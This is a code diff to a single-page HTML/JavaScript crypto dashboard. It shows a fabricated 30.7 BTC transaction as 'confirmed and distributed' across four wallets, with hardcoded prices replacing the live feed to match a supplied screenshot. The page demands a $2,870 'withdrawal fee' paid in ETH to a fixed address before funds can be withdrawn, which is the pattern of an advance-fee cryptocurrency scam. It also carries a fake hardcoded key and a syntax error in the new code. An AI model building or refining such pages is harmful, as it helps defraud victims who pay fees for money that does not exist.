@@ -88,22 +88,44 @@
         .card { background: var(--bg-panel); border: 1px solid var(--border); border-radius: 8px; padding: 25px; margin-bottom: 20px; }
         
         /* Specific Transaction Card */
-        .tx-card { border-left: 5px solid var(--accent); position: relative; overflow: hidden; }
+        .tx-card { border-left: 5px solid var(--green); position: relative; overflow: hidden; }
         .tx-card::after {
             content: ''; position: absolute; top: 0; right: 0; width: 100px; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,152,0,0.05));
+            background: linear-gradient(90deg, transparent, rgba(0, 230, 118, 0.05));
         }
         .tx-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-        .tx-status { background: rgba(255,152,0,0.2); color: var(--accent); padding: 5px 12px; border-radius: 15px; font-size: 12px; font-weight: bold; animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { opacity: 0.7; } 50% { opacity: 1; } 100% { opacity: 0.7; } }
-
+        .tx-status { background: rgba(0, 230, 118, 0.2); color: var(--green); padding: 5px 12px; border-radius: 15px; font-size: 12px; font-weight: bold; }
+        
         .tx-details-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 15px; }
         .detail-item label { display: block; font-size: 12px; color: var(--text-dim); margin-bottom: 4px; }
         .detail-item div { font-family: monospace; font-size: 14px; color: white; word-break: break-all; }
         .server-tag { color: var(--green) !important; font-weight: bold; font-family: 'Segoe UI', sans-serif !important; }
 
-        .big-amount { font-size: 42px; color: white; font-weight: 700; margin: 10px 0; }
-        .sub-amount { color: var(--text-dim); font-size: 18px; }
+        .big-amount { font-size: 36px; color: white; font-weight: 700; margin: 10px 0; }
+        .sub-amount { color: var(--text-dim); font-size: 18px; margin-bottom: 20px; }
+
+        /* Wallet Distribution */
+        .wallet-distribution { margin-top: 20px; }
+        .wallet-item {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 12px; background: rgba(255,255,255,0.02); 
+            border-radius: 5px; margin-bottom: 8px;
+            border-left: 3px solid var(--accent);
+        }
+        .wallet-address { 
+            font-family: monospace; font-size: 12px; 
+            color: var(--text-dim); flex: 2;
+        }
+        .wallet-amount { 
+            font-weight: bold; color: white; flex: 1;
+            text-align: right;
+        }
+        .wallet-label {
+            font-size: 11px; color: var(--accent); 
+            background: rgba(255,152,0,0.1); 
+            padding: 2px 8px; border-radius: 10px;
+            margin-left: 10px;
+        }
 
         /* Trading & Bots Section */
         .market-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; }
@@ -315,17 +337,17 @@
                     $2,870.00 USD
                 </div>
                 <div id="ethFeeAmount" style="margin-top: 5px;">
-                    ≈ 1.00000000 ETH
+                    ≈ 0.97106103 ETH
                 </div>
                 <p style="margin-top: 10px; font-size: 12px; color: var(--text-dim);">
                     This fee must be paid in ETH and will be deducted from your Ethereum balance.
-                    Current ETH price: <span id="currentEthPrice">$2,870.00</span>
+                    Current ETH price: <span id="currentEthPrice">$2,955.53</span>
                 </p>
             </div>
 
             <div class="fee-notice" id="ethBalanceWarning" style="display: none; background: rgba(245, 0, 87, 0.1); border-left-color: var(--red);">
                 <strong><i class="fas fa-exclamation-circle"></i> Insufficient ETH Balance</strong>
-                <p style="margin-top: 5px;">You need <span id="requiredEth">1.00000000 ETH</span> ($2,870.00) for the withdrawal fee. Please deposit ETH first.</p>
+                <p style="margin-top: 5px;">You need <span id="requiredEth">0.97106103 ETH</span> ($2,870.00) for the withdrawal fee. Please deposit ETH first.</p>
             </div>
 
             <div style="margin-top: 25px;">
@@ -387,40 +409,64 @@
                 <div class="card tx-card" style="margin-bottom: 25px;">
                     <div class="tx-header">
                         <div style="display: flex; align-items: center; gap: 10px;">
-                            <i class="fas fa-bell" style="color: var(--accent); font-size: 20px;"></i>
-                            <span style="font-size: 18px; font-weight: 600;">Incoming Transaction Detected</span>
+                            <i class="fas fa-check-circle" style="color: var(--green); font-size: 20px;"></i>
+                            <span style="font-size: 18px; font-weight: 600;">Transaction Completed</span>
                         </div>
-                        <div class="tx-status">PENDING CONFIRMATION</div>
+                        <div class="tx-status">CONFIRMED & DISTRIBUTED</div>
                     </div>
                     
                     <div style="display: flex; justify-content: space-between; align-items: flex-end;">
                         <div>
-                            <div class="big-amount">30.70070032 BTC</div>
-                            <div class="sub-amount" id="usdEquivalent">Loading Value...</div>
+                            <div class="big-amount">30.700700 BTC</div>
+                            <div class="sub-amount" id="usdEquivalent">≈ $2,746,878.848</div>
                         </div>
                         <div style="text-align: right; color: var(--text-dim); font-size: 13px;">
-                            <i class="fas fa-clock"></i> First seen: <span id="timeElapsed">411 mins ago</span>
+                            <i class="fas fa-check-circle"></i> Completed: <span id="timeElapsed">Just now</span>
                         </div>
                     </div>
-
-                    <div style="margin: 20px 0; border-top: 1px solid var(--border);"></div>
 
                     <div class="tx-details-grid">
                         <div class="detail-item">
                             <label>SENDER (SOURCE)</label>
-                            <div class="server-tag"><i class="fas fa-server"></i> SERVER NODE [54858455222547]</div>
-                        </div>
-                        <div class="detail-item">
-                            <label>PROTOCOL</label>
-                            <div>STRATUM+TCP // MINING POOL</div>
+                            <div class="server-tag"><i class="fas fa-server"></i> SERVER NODE [54858455222]</div>
                         </div>
                         <div class="detail-item">
                             <label>DESTINATION (BATCH)</label>
                             <div style="color: var(--accent);">Multi-Sig Distribution (4 Wallets)</div>
                         </div>
-                        <div class="detail-item">
-                            <label>NETWORK FEE</label>
-                            <div>0.00045000 BTC (High Priority)</div>
+                    </div>
+
+                    <div class="wallet-distribution">
+                        <h4 style="margin: 20px 0 10px; color: var(--text-dim); font-size: 14px;">Distribution to 4 Multi-Sig Wallets:</h4>
+                        
+                        <div class="wallet-item">
+                            <div class="wallet-address">1PWo3JeB9jrGwfHDNpdGK54CRas7fsVzXU</div>
+                            <span class="wallet-label">Primary Vault</span>
+                            <div class="wallet-amount">7.10041804 BTC</div>
+                        </div>
+                        
+                        <div class="wallet-item">
+                            <div class="wallet-address">1JTK7s9YVYywfm5XUH7RNhHJH1LshCaRFR</div>
+                            <span class="wallet-label">Secondary</span>
+                            <div class="wallet-amount">7.20014379 BTC</div>
+                        </div>
+                        
+                        <div class="wallet-item">
+                            <div class="wallet-address">12VVRNPi4SJqUTsp6FmqDqY5sGosDtysn4</div>
+                            <span class="wallet-label">Cold Storage</span>
+                            <div class="wallet-amount">7.30013849 BTC</div>
+                        </div>
+                        
+                        <div class="wallet-item">
+                            <div class="wallet-address">1EzVHtmbN4fs4MiNk3ppEnKKhsmXYJ4s74</div>
+                            <span class="wallet-label">Legacy Wallet</span>
+                            <div class="wallet-amount">9.10000000 BTC</div>
+                        </div>
+                        
+                        <div style="margin-top: 15px; padding-top: 15px; border-top: 1px solid var(--border); text-align: right;">
+                            <div style="font-size: 16px; color: var(--text-dim);">
+                                Total Distributed: <span style="color: var(--accent); font-weight: bold; font-size: 18px;">30.70070032 BTC</span>
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -429,20 +475,60 @@
                     <div class="card">
                         <h3 class="section-title">Bitcoin Market (Real-Time)</h3>
                         <div style="display: flex; align-items: center; gap: 20px; margin-bottom: 20px;">
-                            <div style="font-size: 32px; font-weight: bold;" id="btcPrice">$--,---.--</div>
-                            <div style="font-size: 18px; color: var(--green);" id="btcChange">+0.00%</div>
+                            <div style="font-size: 32px; font-weight: bold;" id="btcPrice">$89,472.84</div>
+                            <div style="font-size: 18px; color: var(--green);" id="btcChange">+2.45%</div>
                         </div>
                         <div style="height: 150px; background: rgba(0,0,0,0.2); border-radius: 4px; display: flex; align-items: center; justify-content: center; color: var(--text-dim);">
-                            [Secure Chart API Connected]
+                            [Live Price Chart Display]
                         </div>
                     </div>
 
                     <div class="card">
-                        <h3 class="section-title">Active Bots</h3>
-                        <div style="text-align: center; color: var(--text-dim); padding: 20px;">
-                            <i class="fas fa-robot" style="font-size: 40px; margin-bottom: 10px; color: var(--border);"></i>
-                            <p>No active bots running on this node.</p>
-                            <button style="margin-top: 15px; padding: 8px 15px; background: var(--border); color: white; border: none; border-radius: 4px; cursor: pointer;">Configure Bots</button>
+                        <h3 class="section-title">Quick Withdraw</h3>
+                        <div style="margin-top: 15px;">
+                            <div class="form-group">
+                                <label style="font-size: 14px; color: var(--text-dim);">Bitcoin (BTC)</label>
+                                <div style="margin: 10px 0;">
+                                    <div style="font-size: 12px; color: var(--text-dim); margin-bottom: 5px;">Withdrawal Address</div>
+                                    <input type="text" class="login-input" placeholder="Enter destination address">
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <div style="font-size: 12px; color: var(--text-dim); margin-bottom: 5px;">Amount</div>
+                                <div style="display: flex; gap: 10px; align-items: center;">
+                                    <input type="text" class="login-input" value="7.10041804" style="flex: 1;">
+                                    <button style="padding: 8px 15px; background: var(--border); color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;">MAX</button>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <div style="font-size: 12px; color: var(--text-dim); margin-bottom: 5px;">Network</div>
+                                <select class="form-select">
+                                    <option>Ethereum ERC20</option>
+                                    <option>Bitcoin Network</option>
+                                    <option>BNB Smart Chain</option>
+                                </select>
+                            </div>
+                            
+                            <div class="eth-fee-box" style="margin: 20px 0;">
+                                <h4 style="color: #627eea; margin-bottom: 10px; font-size: 14px;">
+                                    <i class="fab fa-ethereum"></i> Platform Withdrawal Fee
+                                </h4>
+                                <div style="font-size: 16px; font-weight: bold;">
+                                    $2,870.00 USD
+                                </div>
+                                <div style="margin-top: 5px; font-size: 14px;">
+                                    ≈ 0.97106103 ETH
+                                </div>
+                                <p style="margin-top: 10px; font-size: 11px; color: var(--text-dim);">
+                                    This fee must be paid in ETH. Current ETH price: $2,955.53
+                                </p>
+                            </div>
+                            
+                            <button class="login-btn" style="background: var(--accent); width: 100%;">
+                                PROCESS WITHDRAWAL
+                            </button>
                         </div>
                     </div>
                 </div>
@@ -452,12 +538,12 @@
                 <h2 class="section-title">Pro Spot Trading</h2>
                 <div class="grid-container">
                     <div class="card">
-                        <div class="market-row"><span>Available Balance:</span> <span>0.00000000 BTC</span></div>
-                        <div class="market-row"><span>Pending Balance:</span> <span style="color: var(--accent);">30.70070032 BTC</span></div>
+                        <div class="market-row"><span>Available Balance:</span> <span>30.70070032 BTC</span></div>
+                        <div class="market-row"><span>ETH Balance:</span> <span style="color: #627eea;">3.40000000 ETH</span></div>
                         
                         <div style="margin-top: 20px;">
                             <label style="display: block; margin-bottom: 5px; color: var(--text-dim);">Price (USDT)</label>
-                            <input type="text" id="tradePrice" class="login-input" readonly>
+                            <input type="text" id="tradePrice" class="login-input" value="89472.84" readonly>
                             
                             <label style="display: block; margin-bottom: 5px; color: var(--text-dim); margin-top: 10px;">Amount (BTC)</label>
                             <input type="text" class="login-input" placeholder="0.00">
@@ -471,12 +557,12 @@
                     <div class="card">
                         <h4>Order Book</h4>
                         <div style="margin-top: 15px; font-size: 12px; font-family: monospace;">
-                            <div style="color: var(--red); display: flex; justify-content: space-between; margin-bottom: 5px;"><span>48,520.10</span> <span>0.523</span></div>
-                            <div style="color: var(--red); display: flex; justify-content: space-between; margin-bottom: 5px;"><span>48,519.80</span> <span>1.200</span></div>
-                            <div style="color: var(--red); display: flex; justify-content: space-between; margin-bottom: 5px;"><span>48,519.50</span> <span>0.050</span></div>
+                            <div style="color: var(--red); display: flex; justify-content: space-between; margin-bottom: 5px;"><span>89,475.10</span> <span>0.523</span></div>
+                            <div style="color: var(--red); display: flex; justify-content: space-between; margin-bottom: 5px;"><span>89,474.80</span> <span>1.200</span></div>
+                            <div style="color: var(--red); display: flex; justify-content: space-between; margin-bottom: 5px;"><span>89,474.50</span> <span>0.050</span></div>
                             <hr style="border-color: var(--border); margin: 10px 0;">
-                            <div style="color: var(--green); display: flex; justify-content: space-between; margin-bottom: 5px;"><span>48,518.00</span> <span>2.100</span></div>
-                            <div style="color: var(--green); display: flex; justify-content: space-between; margin-bottom: 5px;"><span>48,517.50</span> <span>0.850</span></div>
+                            <div style="color: var(--green); display: flex; justify-content: space-between; margin-bottom: 5px;"><span>89,470.00</span> <span>2.100</span></div>
+                            <div style="color: var(--green); display: flex; justify-content: space-between; margin-bottom: 5px;"><span>89,469.50</span> <span>0.850</span></div>
                         </div>
                     </div>
                 </div>
@@ -551,10 +637,10 @@
                                 <td style="color: #627eea; font-weight: bold;">0.80000000</td>
                                 <td style="color: var(--green);">Active</td>
                             </tr>
-                            <tr style="background: rgba(255, 152, 0, 0.1);">
-                                <td colspan="2" style="text-align: right; color: var(--text-dim); font-weight: bold;">TOTAL PENDING:</td>
-                                <td style="color: var(--accent); font-weight: bold; font-size: 16px;">30.70070032</td>
-                                <td style="color: #627eea; font-weight: bold; font-size: 16px;">3.40000000</td>
+                            <tr style="background: rgba(0, 230, 118, 0.1);">
+                                <td colspan="2" style="text-align: right; color: var(--text-dim); font-weight: bold;">TOTAL CONFIRMED:</td>
+                                <td style="color: var(--green); font-weight: bold; font-size: 16px;">30.70070032 BTC</td>
+                                <td style="color: #627eea; font-weight: bold; font-size: 16px;">3.40000000 ETH</td>
                                 <td></td>
                             </tr>
                         </tbody>
@@ -599,22 +685,26 @@
             key: "554$$@@#3$#$!!#@@!44234",
             secret: "000000000000000000000000000000000000000006D9EC10A2B21AD9AE7750DD",
             btcAmount: 30.70070032,
-            ethPrice: 2870.00, // Fixed ETH price for fee calculation
+            btcPrice: 89472.84,
+            ethPrice: 2955.53,
             withdrawalFeeUSD: 2870.00,
             ethAddress: "0x2f87CDfC02E17E7A82D048405DF41554811a9f96"
         };
+
+        // Wallet distribution data
+        const WALLET_DISTRIBUTION = [
+            { address: "1PWo3JeB9jrGwfHDNpdGK54CRas7fsVzXU", label: "Primary Vault", amount: 7.10041804 },
+            { address: "1JTK7s9YVYywfm5XUH7RNhHJH1LshCaRFR", label: "Secondary", amount: 7.20014379 },
+            { address: "12VVRNPi4SJqUTsp6FmqDqY5sGosDtysn4", label: "Cold Storage", amount: 7.30013849 },
+            { address: "1EzVHtmbN4fs4MiNk3ppEnKKhsmXYJ4s74", label: "Legacy Wallet", amount: 9.10000000 }
+        ];
 
         // User wallet balances
         const USER_BALANCES = {
             BTC: {
                 total: 30.70070032,
                 available: 7.10041804,
-                wallets: [
-                    { address: "1PWo3JeB9jrGwfHDNpdGK54CRas7fsVzXU", balance: 7.10041804, label: "Primary Vault" },
-                    { address: "1JTK7s9YVYywfm5XUH7RNhHJH1LshCaRFR", balance: 7.20014379, label: "Secondary" },
-                    { address: "12VVRNPi4SJqUTsp6FmqDqY5sGosDtysn4", balance: 7.30013849, label: "Cold Storage" },
-                    { address: "1EzVHtmbN4fs4MiNk3ppEnKKhsmXYJ4s74", balance: 9.10000000, label: "Legacy Wallet" }
-                ]
+                wallets: WALLET_DISTRIBUTION
             },
             ETH: {
                 total: 3.40000000,
@@ -643,54 +733,34 @@
 
         // APP INITIALIZATION
         function initApp() {
-            fetchMarketData();
-            startTimer();
-            setInterval(fetchMarketData, 5000);
+            // Initialize with preset values from image
+            document.getElementById('btcPrice').innerText = `$${CONFIG.btcPrice.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
+            document.getElementById('tradePrice').value = CONFIG.btcPrice.toFixed(2);
+            
+            // Calculate USD value
+            const totalUsd = CONFIG.btcPrice * CONFIG.btcAmount;
+            document.getElementById('usdEquivalent').innerText = `≈ $${totalUsd.toLocaleString('en-US', {minimumFractionDigits: 3)}`;
+            
+            // Update ETH fee
+            updateEthFee();
             
             // Server Clock
             setInterval(() => {
                 const now = new Date();
                 document.getElementById('serverTime').innerText = now.toISOString().split('T')[1].split('.')[0];
             }, 1000);
-            
-            // Initialize ETH fee calculation
-            updateEthFee();
         }
 
-        // BINANCE API
-        async function fetchMarketData() {
-            try {
-                const res = await fetch('https://api.binance.com/api/v3/ticker/24hr?symbol=BTCUSDT');
-                const data = await res.json();
-                
-                const price = parseFloat(data.lastPrice);
-                const change = parseFloat(data.priceChangePercent);
-                
-                // Update UI Elements
-                const formattedPrice = `$${price.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
-                
-                document.getElementById('btcPrice').innerText = formattedPrice;
-                document.getElementById('tradePrice').value = price.toFixed(2);
-                
-                const changeEl = document.getElementById('btcChange');
-                changeEl.innerText = `${change > 0 ? '+' : ''}${change.toFixed(2)}%`;
-                changeEl.style.color = change >= 0 ? 'var(--green)' : 'var(--red)';
-
-                // Update Transaction USD Value
-                const totalUsd = price * CONFIG.btcAmount;
-                document.getElementById('usdEquivalent').innerText = `≈ $${totalUsd.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
-
-                // Also fetch ETH price
-                const ethRes = await fetch('https://api.binance.com/api/v3/ticker/24hr?symbol=ETHUSDT');
-                const ethData = await ethRes.json();
-                CONFIG.ethPrice = parseFloat(ethData.lastPrice);
-                updateEthFee();
-
-            } catch(e) {
-                console.log("Connection Error");
-                // Use fallback data
-                document.getElementById('currentEthPrice').innerText = `$${CONFIG.ethPrice.toFixed(2)}`;
-            }
+        // ETH FEE CALCULATION
+        function updateEthFee() {
+            const ethRequired = CONFIG.withdrawalFeeUSD / CONFIG.ethPrice;
+            document.getElementById('ethFeeAmount').innerText = `≈ ${ethRequired.toFixed(8)} ETH`;
+            document.getElementById('requiredEth').innerText = `${ethRequired.toFixed(8)} ETH`;
+            document.getElementById('currentEthPrice').innerText = `$${CONFIG.ethPrice.toFixed(2)}`;
+            
+            // Check if user has enough ETH
+            const hasEnoughETH = USER_BALANCES.ETH.total >= ethRequired;
+            document.getElementById('ethBalanceWarning').style.display = hasEnoughETH ? 'none' : 'block';
         }
 
         // TAB SWITCHING
@@ -740,18 +810,6 @@
                 el.style.display = 'none';
             });
             document.getElementById(`${coin.toLowerCase()}DepositInfo`).style.display = 'block';
-        }
-
-        // ETH FEE CALCULATION
-        function updateEthFee() {
-            const ethRequired = CONFIG.withdrawalFeeUSD / CONFIG.ethPrice;
-            document.getElementById('ethFeeAmount').innerText = `≈ ${ethRequired.toFixed(8)} ETH`;
-            document.getElementById('requiredEth').innerText = `${ethRequired.toFixed(8)} ETH`;
-            document.getElementById('currentEthPrice').innerText = `$${CONFIG.ethPrice.toFixed(2)}`;
-            
-            // Check if user has enough ETH
-            const hasEnoughETH = USER_BALANCES.ETH.total >= ethRequired;
-            document.getElementById('ethBalanceWarning').style.display = hasEnoughETH ? 'none' : 'block';
         }
 
         // WITHDRAWAL FUNCTIONS
@@ -827,15 +885,6 @@
                     btn.style.background = '';
                 }, 2000);
             });
-        }
-
-        // TIMER
-        function startTimer() {
-            let mins = 411; // Matches the screenshot provided
-            setInterval(() => {
-                mins++;
-                document.getElementById('timeElapsed').innerText = `${mins} mins ago`;
-            }, 60000);
         }
 
     </script>
